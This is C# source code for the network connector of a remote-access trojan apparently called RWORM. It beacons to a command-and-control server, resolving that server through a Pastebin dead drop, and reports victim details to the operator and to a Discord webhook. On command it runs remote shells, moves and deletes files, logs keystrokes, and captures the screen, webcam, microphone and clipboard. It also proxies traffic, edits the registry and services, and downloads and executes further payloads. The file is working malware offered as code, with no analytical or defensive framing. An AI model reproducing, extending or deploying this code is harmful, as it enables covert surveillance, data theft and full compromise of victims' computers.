using System;

using System.Net.Sockets;

using System.Security.Cryptography;

using System.Text;

using System.Text.Json;

using System.Threading;

using System.Threading.Tasks;

using RWORM.Client.Core;

using RWORM.Client.Modules;



namespace RWORM.Client.Network

{

    public class Connector

    {

        

        private TcpClient?         _client;

        private NetworkStream?     _stream;

        private volatile bool      _connected;

        private CancellationTokenSource? _cts;

        private readonly object    _writeLock = new();

        private readonly System.Collections.Generic.List<byte> _recvBuffer = new();



        

        private readonly object     _shellLock = new();

        private System.Diagnostics.Process? _shellProcess;



        private Keylogger?    _keylogger;

        private bool          _keyloggerOnline;   

        private RemoteDesktop?_remoteDesktop;
        private WebcamManager? _webcamManager;
        private AudioManager?  _audioManager;
        private ReverseProxyManager? _proxyManager;
        private ClientChatManager?   _chatManager;



        public bool IsConnected => _connected;



        

        public async Task ConnectAsync(string host, int port)

        {

            _cts = new CancellationTokenSource();



            

            if (Config.KeyloggerEnabled && !Config.KeyloggerOnline)

                EnsureKeylogger(online: false);



            int  delay    = Config.ReconnectDelay;

            bool taskDone = false;



            

            

            

            

            

            

            while (!_cts.Token.IsCancellationRequested)

            {

                try

                {

                    if (!string.IsNullOrWhiteSpace(Config.PastebinRaw))

                    {

                        await ResolvePastebinHostAsync().ConfigureAwait(false);

                        host = Config.C2Host;

                        port = Config.C2Port;

                    }



                    var client = new TcpClient();

                    using (var timeout = CancellationTokenSource.CreateLinkedTokenSource(_cts.Token))

                    {

                        timeout.CancelAfter(Config.ConnectTimeout);

                        await client.ConnectAsync(host, port).WaitAsync(timeout.Token);

                    }



                    _client    = client;

                    _stream    = client.GetStream();

                    _connected = true;

                    _recvBuffer.Clear();

                    delay = Config.ReconnectDelay;   



                    await SendSystemInfo();



                    if (Config.DiscordAlert && !string.IsNullOrWhiteSpace(Config.DiscordWebhook))

                    {

                        var ep = client.Client.RemoteEndPoint?.ToString() ?? "";

                        _ = DiscordNotifier.SendConnectAlertAsync(

                            Config.DiscordWebhook,

                            Config.GetHostname(),

                            Config.GetUsername(),

                            Config.GetOSVersion(),

                            ep,

                            Config.GetGuid());

                    }



                    

                    if (Config.KeyloggerEnabled && Config.KeyloggerOnline)

                        EnsureKeylogger(online: true);



                    

                    if (!taskDone && Config.TaskEnabled && !string.IsNullOrWhiteSpace(Config.TaskLoaderUrl))

                    {

                        taskDone = true;

                        _ = Task.Run(RunConnectTask);

                    }



                    

                    

                    await RunSessionAsync(_cts.Token);

                }

                catch (OperationCanceledException) when (_cts.IsCancellationRequested)

                {

                    break;   

                }

                catch

                {

                    

                }

                finally

                {

                    _connected = false;

                    try { _stream?.Close(); } catch { }

                    try { _client?.Close(); } catch { }

                }



                if (_cts.IsCancellationRequested) break;



                

                int jitterMs = Random.Shared.Next((int)(delay * 0.75), (int)(delay * 1.25) + 1);

                try { await Task.Delay(jitterMs, _cts.Token).ConfigureAwait(false); }


                catch (OperationCanceledException) { break; }

                delay = Math.Min(delay * 2, 60_000);   

            }

        }



        

        

        

        

        

        

        private async Task RunSessionAsync(CancellationToken owner)

        {

            using var sessionCts = CancellationTokenSource.CreateLinkedTokenSource(owner);

            var token = sessionCts.Token;



            var receive   = Task.Run(() => ReceiveLoop(token), CancellationToken.None);

            var heartbeat = Task.Run(() => HeartbeatLoop(token), CancellationToken.None);



            await Task.WhenAny(receive, heartbeat);



            

            sessionCts.Cancel();

            try { await Task.WhenAll(receive, heartbeat); } catch { }

        }



        private static async Task ResolvePastebinHostAsync()

        {

            try

            {

                using var http = new System.Net.Http.HttpClient { Timeout = TimeSpan.FromSeconds(6) };

                var raw = (await http.GetStringAsync(Config.PastebinRaw).ConfigureAwait(false)).Trim();

                var parts = raw.Split(':');

                if (parts.Length == 2 && int.TryParse(parts[1], out int p))

                {

                    Config.C2Host = parts[0].Trim();

                    Config.C2Port = p;

                }

                else if (parts.Length == 1 && !string.IsNullOrWhiteSpace(parts[0]))

                {

                    Config.C2Host = parts[0].Trim();

                }

            }

            catch { }

        }



        private async Task RunConnectTask()

        {

            var result = await LoaderModule.LoadAndExecute(Config.TaskLoaderUrl);

            await SendAsync(CreatePacket(0xB1, 0, result));

        }



        private void EnsureKeylogger(bool online)

        {

            

            if (_keylogger?.IsRunning == true && _keyloggerOnline == online) return;



            

            

            

            

            if (_keylogger != null)

            {

                try { _keylogger.Stop(); } catch { }

                _keylogger = null;

            }



            _keyloggerOnline = online;

            _keylogger = new Keylogger

            {

                OnFlush = async data => await SendAsync(CreatePacket(0x42, 0, data))

            };

            _keylogger.Start(online);

        }



        public void Disconnect()

        {

            _cts?.Cancel();

            _connected = false;

            CloseInteractiveShell();

            _remoteDesktop?.Stop();
            _webcamManager?.Stop();
            _audioManager?.Stop();
            _proxyManager?.Stop();
            _chatManager?.Close();

            try { _stream?.Close(); } catch { }

            try { _client?.Close(); } catch { }

        }



        

        public async Task SendAsync(byte[] data)

        {

            if (!_connected || _stream == null) return;

            try { lock (_writeLock) { _stream.Write(data, 0, data.Length); _stream.Flush(); } }

            catch

            {

                

                

                

                

                

                _connected = false;

                try { _stream?.Close(); } catch { }

                try { _client?.Close(); } catch { }

            }

        }



        

        private async Task ReceiveLoop(CancellationToken token)

        {

            var chunk = new byte[65536];

            try

            {

                while (_connected && !token.IsCancellationRequested)

                {

                    if (_stream == null || !_stream.CanRead) break;

                    int n = await _stream.ReadAsync(chunk, 0, chunk.Length, token).ConfigureAwait(false);

                    if (n == 0) break;

                    lock (_recvBuffer) for (int i = 0; i < n; i++) _recvBuffer.Add(chunk[i]);

                    DrainPackets();

                }

            }

            catch { }

            finally

            {

                

                

                _connected = false;

            }

        }



        

        private void DrainPackets()

        {

            while (true)

            {

                byte[] raw;

                lock (_recvBuffer) raw = _recvBuffer.ToArray();

                if (raw.Length < 25) return;

                int  pLen   = BitConverter.ToInt32(raw, 0);

                byte pType  = raw[4];
                int  pChan  = BitConverter.ToInt32(raw, 5);

                if (pLen < 0 || pLen > 50 * 1024 * 1024) { lock (_recvBuffer) _recvBuffer.Clear(); return; }

                int totalLen = 9 + pLen + 16;

                if (raw.Length < totalLen) return;



                var header     = new byte[9]; Array.Copy(raw, 0, header,  0, 9);

                var encPayload = new byte[pLen]; Array.Copy(raw, 9, encPayload, 0, pLen);

                var rcvMac     = new byte[16]; Array.Copy(raw, 9 + pLen, rcvMac, 0, 16);



                var comb = new byte[9 + pLen];

                Array.Copy(header, 0, comb, 0, 9);

                Array.Copy(encPayload, 0, comb, 9, pLen);

                var expectedMac = Crypto.ComputeHMAC(comb);



                bool match = true;

                for (int i = 0; i < 16; i++)

                {

                    if (expectedMac[i] != rcvMac[i]) { match = false; break; }

                }



                if (!match)

                {

                    lock (_recvBuffer) _recvBuffer.Clear();

                    return;

                }



                var plainPayload = Crypto.Decrypt(encPayload);

                if (plainPayload == null)

                {

                    lock (_recvBuffer) _recvBuffer.Clear();

                    return;

                }



                lock (_recvBuffer) _recvBuffer.RemoveRange(0, totalLen);

                _ = Task.Run(() => DispatchPacket(pType, pChan, plainPayload));

            }

        }



        

        private async Task DispatchPacket(byte type, int channel, byte[] payload)

        {

            var txt = () => Encoding.UTF8.GetString(payload);



            switch (type)

            {

                

                case 0x03: ExecuteShellCommand(txt());  break;

                case 0x20: OpenInteractiveShell();       break;

                case 0x21: SendToInteractiveShell(txt()); break;

                case 0x23: CloseInteractiveShell();      break;



                

                case 0x30: 

                    await SendAsync(CreatePacket(0x31, 0, FileOps.ListDirectory(txt())));

                    break;

                case 0x32: 

                    await SendAsync(CreatePacket(0x33, 0, FileOps.ReadFile(txt())));

                    break;

                case 0x34: 

                {

                    int sep = Array.IndexOf(payload, (byte)0);

                    if (sep > 0)

                    {

                        var path  = Encoding.UTF8.GetString(payload, 0, sep);

                        var data  = new byte[payload.Length - sep - 1];

                        Array.Copy(payload, sep + 1, data, 0, data.Length);

                        await SendAsync(CreatePacket(0x37, 0, FileOps.WriteFile(path, data)));

                    }

                    break;

                }

                case 0x35: 

                    await SendAsync(CreatePacket(0x37, 0, FileOps.DeletePath(txt())));

                    break;

                case 0x36: 

                    await SendAsync(CreatePacket(0x37, 0, FileOps.MakeDir(txt())));

                    break;



                

                case 0x40: 

                    EnsureKeylogger(txt() == "online");

                    break;

                case 0x41: 

                    if (_keylogger != null)

                    {

                        try { _keylogger.Stop(); } catch { }

                        _keylogger = null;

                    }

                    break;

                case 0x43: 

                    await SendAsync(CreatePacket(0x42, 0, _keylogger?.GetOfflineLog() ?? ""));

                    break;



                

                case 0x50: 

                    await SendAsync(CreatePacket(0x51, 0, ProcManager.ListProcesses()));

                    break;

                case 0x52: 

                    if (int.TryParse(txt(), out int pid))

                        await SendAsync(CreatePacket(0x37, 0, ProcManager.KillProcess(pid)));

                    break;



                

                case 0x60: 

                    await SendAsync(CreatePacket(0x61, 0, RegEditor.ListKey(txt())));

                    break;

                case 0x64: 

                {

                    var parts = txt().Split('\x00');

                    if (parts.Length >= 4)

                        await SendAsync(CreatePacket(0x63, 0,

                            RegEditor.WriteValue(parts[0], parts[1], parts[2], parts[3])));

                    break;

                }

                case 0x65: 

                {

                    var parts = txt().Split('\x00', 2);

                    if (parts.Length == 2)

                        await SendAsync(CreatePacket(0x63, 0,

                            RegEditor.DeleteValue(parts[0], parts[1])));

                    break;

                }



                

                

                case 0x55: 

                    await SendAsync(CreatePacket(0x56, 0, SysMetrics.GetMetricsJson()));

                    break;



                case 0x70: 

                    await SendAsync(CreatePacket(0x71, 0,

                        await LoaderModule.LoadAndExecute(txt())));

                    break;



                                
                case 0x90: 
                case 0x91: 
                case 0x92: 
                    if (_proxyManager == null)
                    {
                        _proxyManager = new ReverseProxyManager(async (op, chan, data) =>
                        {
                            await SendAsync(CreatePacket(op, chan, data));
                        });
                        _proxyManager.Start();
                    }
                    _proxyManager.HandlePacket(type, channel, payload);
                    break;

                

                case 0x80: 
                {
                    int monIdx = 0;
                    if (payload.Length > 0 && int.TryParse(txt(), out int parsedIdx))
                        monIdx = parsedIdx;

                    _remoteDesktop?.Stop();
                    _remoteDesktop = new RemoteDesktop
                    {
                        Fps          = 10,
                        Quality      = 35,
                        MonitorIndex = monIdx,
                        OnFrame      = async frame => await SendAsync(CreatePacket(0x81, 0, frame))
                    };
                    _remoteDesktop.Start();
                    break;
                }

                case 0x82: 
                {
                    RemoteDesktop.HandleInput(txt());
                    break;
                }

                
                case 0xC0: 
                    await SendAsync(CreatePacket(0xC1, 0, ServiceManager.ListServices()));
                    break;
                case 0xC2: 
                {
                    var parts = txt().Split('\x00');
                    if (parts.Length >= 2)
                        await SendAsync(CreatePacket(0xC3, 0, ServiceManager.ControlService(parts[0], parts[1])));
                    break;
                }

                
                case 0xC4: 
                    await SendAsync(CreatePacket(0xC5, 0, NetMonitor.ListConnections()));
                    break;

                
                case 0xC6: 
                    await SendAsync(CreatePacket(0xC7, 0, AutorunManager.ListStartupEntries()));
                    break;
                case 0xC8: 
                {
                    var parts = txt().Split('\x00');
                    if (parts.Length >= 3)
                        await SendAsync(CreatePacket(0xC9, 0, AutorunManager.DeleteStartupEntry(parts[0], parts[1], parts[2])));
                    break;
                }

                
                case 0xCA: 
                    await SendAsync(CreatePacket(0xCB, 0, ClipboardManager.GetClipboardText()));
                    break;
                case 0xCC: 
                    await SendAsync(CreatePacket(0xCD, 0, ClipboardManager.SetClipboardText(txt())));
                    break;

                case 0x84: 

                    await SendAsync(CreatePacket(0x85, 0, RemoteDesktop.GetMonitorsJson()));

                    break;

                case 0x83: 

                    _remoteDesktop?.Stop();

                    _remoteDesktop = null;

                    break;



                
                case 0xE0: 
                    await SendAsync(CreatePacket(0xE1, 0, WebcamManager.GetDevicesJson()));
                    break;
                case 0xE2: 
                {
                    int devIdx = 0;
                    if (payload.Length > 0 && int.TryParse(txt(), out int parsedDev))
                        devIdx = parsedDev;
                    _webcamManager?.Stop();
                    _webcamManager = new WebcamManager(devIdx, async frame => await SendAsync(CreatePacket(0xE3, 0, frame)));
                    _webcamManager.Start();
                    break;
                }
                case 0xE4: 
                    _webcamManager?.Stop();
                    _webcamManager = null;
                    break;

                
                case 0xE5: 
                    _audioManager?.Stop();
                    _audioManager = new AudioManager(async chunk => await SendAsync(CreatePacket(0xE6, 0, chunk)));
                    _audioManager.Start();
                    break;
                case 0xE7: 
                    _audioManager?.Stop();
                    _audioManager = null;
                    break;

                
                case 0xD0: 
                    await SendAsync(CreatePacket(0xD1, 0, UrlOpener.OpenUrl(txt())));
                    break;
                case 0xD2: 
                    await SendAsync(CreatePacket(0xD3, 0, InstalledPrograms.GetInstalledPrograms()));
                    break;
                case 0xD4: 
                    await SendAsync(CreatePacket(0xD5, 0, SystemInfoDetailed.GetDetailedInfo()));
                    break;
                case 0xD6: 
                {
                    string action = txt().Trim().ToLowerInvariant();
                    switch (action)
                    {
                        case "shutdown":  PowerControl.Shutdown();  break;
                        case "restart":   PowerControl.Restart();   break;
                        case "logoff":    PowerControl.Logoff();    break;
                        case "lock":      PowerControl.Lock();      break;
                        case "sleep":     PowerControl.Sleep();     break;
                        case "hibernate": PowerControl.Hibernate(); break;
                    }
                    await SendAsync(CreatePacket(0xD7, 0, Encoding.UTF8.GetBytes("{\"ok\":true}")));
                    break;
                }

                
                case 0xD8: 
                {
                    byte[] resp = MessageBoxHandler.ShowMessageBox(txt());
                    await SendAsync(CreatePacket(0xD9, 0, resp));
                    break;
                }

                
                case 0xEA: 
                {
                    if (_chatManager == null)
                    {
                        _chatManager = new ClientChatManager(async msg =>
                        {
                            await SendAsync(CreatePacket(0xEB, 0, Encoding.UTF8.GetBytes(msg)));
                        });
                    }
                    _chatManager.HandleIncomingMessage(txt());
                    break;
                }
                case 0xEC: 
                    _chatManager?.Close();
                    _chatManager = null;
                    break;

                

                case 0xA0: 

                    Watchdog.PrepareCleanExit();

                    Environment.Exit(0);

                    break;

                case 0xA1: 

                    Watchdog.PrepareCleanExit();

                    LoaderModule.Uninstall(); 

                    break;

                case 0xA2: 

                    await LoaderModule.Update(txt());

                    break;

                case 0xA5: 

                    Watchdog.StopWatchdog();

                    break;

                case 0xA6: 

                    Watchdog.StartWatchdog();

                    break;



                

                case 0xB0: 

                {

                    try

                    {

                        var tmp = System.IO.Path.Combine(

                            System.IO.Path.GetTempPath(),

                            $"rworm_task_{Guid.NewGuid():N}.exe");

                        System.IO.File.WriteAllBytes(tmp, payload);

                        System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo

                        {

                            FileName        = tmp,

                            UseShellExecute = true,

                            WindowStyle     = System.Diagnostics.ProcessWindowStyle.Normal,

                        });

                        await SendAsync(CreatePacket(0xB1, 0,

                            $"{{\"ok\":true,\"path\":\"{tmp.Replace("\\", "\\\\")}\"}}"));

                    }

                    catch (Exception ex)

                    {

                        await SendAsync(CreatePacket(0xB1, 0,

                            $"{{\"ok\":false,\"error\":\"{ex.Message}\"}}"));

                    }

                    break;

                }

            }

        }



        

        private void OpenInteractiveShell()

        {

            lock (_shellLock)

            {

                CloseInteractiveShell();

                try

                {

                    var psi = new System.Diagnostics.ProcessStartInfo

                    {

                        FileName = "powershell.exe", Arguments = "-NoProfile -NoLogo -NoExit",

                        UseShellExecute = false, RedirectStandardInput = true,

                        RedirectStandardOutput = true, RedirectStandardError = true,

                        CreateNoWindow = true,

                        StandardOutputEncoding = new UTF8Encoding(false),

                        StandardErrorEncoding  = new UTF8Encoding(false),

                    };

                    _shellProcess = System.Diagnostics.Process.Start(psi);

                    if (_shellProcess == null) return;

                    _shellProcess.StandardInput.AutoFlush = true;

                    var proc = _shellProcess;

                    _ = Task.Run(async () => { try { var b = new char[4096]; while (!proc.HasExited) { int n = await proc.StandardOutput.ReadAsync(b, 0, b.Length); if (n <= 0) break; await SendAsync(CreatePacket(0x22, 0, new string(b, 0, n))); } } catch { } });

                    _ = Task.Run(async () => { try { var b = new char[4096]; while (!proc.HasExited) { int n = await proc.StandardError.ReadAsync(b, 0, b.Length); if (n <= 0) break; await SendAsync(CreatePacket(0x22, 0, "[ERR] " + new string(b, 0, n))); } } catch { } });

                }

                catch { }

            }

        }

        private void SendToInteractiveShell(string input) { System.Diagnostics.Process? p; lock (_shellLock) p = _shellProcess; try { p?.StandardInput.WriteLine(input); } catch { } }

        private void CloseInteractiveShell() { System.Diagnostics.Process? p; lock (_shellLock) { p = _shellProcess; _shellProcess = null; } try { p?.Kill(entireProcessTree: true); p?.Dispose(); } catch { } }



        

        private void ExecuteShellCommand(string command)

        {

            try

            {

                var psi = new System.Diagnostics.ProcessStartInfo

                {

                    FileName = "cmd.exe", Arguments = "/c " + command,

                    UseShellExecute = false, RedirectStandardOutput = true,

                    RedirectStandardError = true, CreateNoWindow = true,

                };

                var p  = System.Diagnostics.Process.Start(psi);

                var out_ = p?.StandardOutput.ReadToEnd() + p?.StandardError.ReadToEnd();

                p?.WaitForExit();

                _ = SendAsync(CreatePacket(0x04, 0, out_ ?? ""));

            }

            catch (Exception ex) { _ = SendAsync(CreatePacket(0x04, 0, $"Error: {ex.Message}")); }

        }



        

        private static async Task<(string ip, string countryCode)> FetchExternalIpInfoAsync()

        {

            try

            {

                using var http = new System.Net.Http.HttpClient { Timeout = TimeSpan.FromMilliseconds(1500) };

                var res = await http.GetStringAsync("http://ip-api.com/json/?fields=status,query,countryCode");

                using var doc = JsonDocument.Parse(res);

                var root = doc.RootElement;

                if (root.TryGetProperty("status", out var s) && s.GetString() == "success")

                {

                    string ip = root.TryGetProperty("query", out var q) ? q.GetString() ?? "" : "";

                    string cc = root.TryGetProperty("countryCode", out var c) ? c.GetString() ?? "" : "";

                    return (ip, cc);

                }

            }

            catch { }

            return ("", "");

        }
        private static string EscapeJson(string? s)
        {
            if (string.IsNullOrEmpty(s)) return "";
            var sb = new StringBuilder();
            foreach (char c in s)
            {
                switch (c)
                {
                    case '\\': sb.Append(@"\\"); break;
                    case '"':  sb.Append(@"\" + "\""); break;
                    case '\r': sb.Append(@"\r"); break;
                    case '\n': sb.Append(@"\n"); break;
                    case '\t': sb.Append(@"\t"); break;
                    default:   sb.Append(c); break;
                }
            }
            return sb.ToString();
        }

        private async Task SendSystemInfo()
        {
            var (extIp, extCc) = await FetchExternalIpInfoAsync();
            var guid = EscapeJson(Config.GetGuid());
            var host = EscapeJson(Config.GetHostname());
            var user = EscapeJson(Config.GetUsername());
            var os   = EscapeJson(Config.GetOSVersion());
            var ip   = EscapeJson(extIp);
            var cc   = EscapeJson(extCc);

            var json = $"{{\"guid\":\"{guid}\",\"hostname\":\"{host}\",\"username\":\"{user}\",\"os_version\":\"{os}\",\"ip_address\":\"{ip}\",\"country_code\":\"{cc}\"}}";
            await SendAsync(CreatePacket(0x02, 0, json));
        }



        

        private async Task HeartbeatLoop(CancellationToken token)

        {

            while (_connected && !token.IsCancellationRequested)

            {

                

                

                

                try { await Task.Delay(Config.HeartbeatInterval, token).ConfigureAwait(false); }

                catch (OperationCanceledException) { break; }

                if (_connected) await SendAsync(CreatePacket(0x01, 0, "ping"));

            }

        }



        

        private byte[] CreatePacket(byte type, int sid, string text) => CreatePacket(type, sid, Encoding.UTF8.GetBytes(text));

        private byte[] CreatePacket(byte type, int sid, byte[] pl)

        {

            var encrypted = Crypto.Encrypt(pl);

            var hdr = new byte[9];

            BitConverter.GetBytes(encrypted.Length).CopyTo(hdr, 0);

            hdr[4] = type;

            BitConverter.GetBytes(sid).CopyTo(hdr, 5);



            var comb = new byte[9 + encrypted.Length];

            Array.Copy(hdr, 0, comb, 0, 9);

            Array.Copy(encrypted, 0, comb, 9, encrypted.Length);

            var mac = Crypto.ComputeHMAC(comb);



            var r = new byte[9 + encrypted.Length + 16];

            Array.Copy(hdr, 0, r, 0, 9);

            Array.Copy(encrypted, 0, r, 9, encrypted.Length);

            Array.Copy(mac, 0, r, 9 + encrypted.Length, 16);

            return r;

        }

    }

}

